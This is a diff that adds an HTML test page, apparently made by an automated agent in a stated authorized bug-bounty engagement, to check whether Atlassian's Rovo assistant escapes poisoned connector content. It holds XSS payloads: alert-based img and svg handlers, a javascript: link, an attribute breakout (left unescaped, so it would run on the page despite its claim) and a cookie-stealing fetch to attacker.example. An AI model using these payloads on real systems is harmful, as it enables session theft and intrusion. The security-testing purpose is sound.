@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Agent5 Rovo Connector Poison Test - XSS Payload Page</title>
+</head>
+<body>
+<h1>Rovo Connector Data-Poisoning Test Page (Agent 5, authorized Bugcrowd engagement)</h1>
+<p>This page is part of an authorized security research fixture for the Atlassian Bugcrowd engagement
+(bugbounty-test-badai.atlassian.net). It contains adversarial content designed to test whether ingested
+third-party connector content is safely handled (escaped) when later rendered inside Rovo Search/Chat
+summaries, snippets, or citations. It is NOT intended to execute anything on this page itself.</p>
+
+<h2>Payload block 1 - literal markup as visible text (should render as inert text on THIS page)</h2>
+<p>Literal-text-payload-A: &lt;img src=x onerror=alert(document.domain)&gt;ROVOPOISONMARK1&lt;/img&gt;</p>
+<p>Literal-text-payload-B: &lt;svg onload=alert('rovo-poison-2')&gt;ROVOPOISONMARK2&lt;/svg&gt;</p>
+<p>Literal-text-payload-C: &lt;script&gt;fetch('https://attacker.example/rovo-poison-exfil?c='+document.cookie)&lt;/script&gt;ROVOPOISONMARK3</p>
+<p>Literal-text-payload-D (markdown-injection style, in case Rovo renders markdown from snippets):
+[click me](javascript:alert('rovo-poison-md'))ROVOPOISONMARK4</p>
+<p>Literal-text-payload-E (attribute breakout attempt):
+"><img src=x onerror=alert('rovo-poison-attr')>ROVOPOISONMARK5</p>
+
+<h2>Unique marker for search verification</h2>
+<p>UNIQUE_SEARCH_MARKER_AGENT5_XSS_POISON_7f3ac91e</p>
+</body>
+</html>
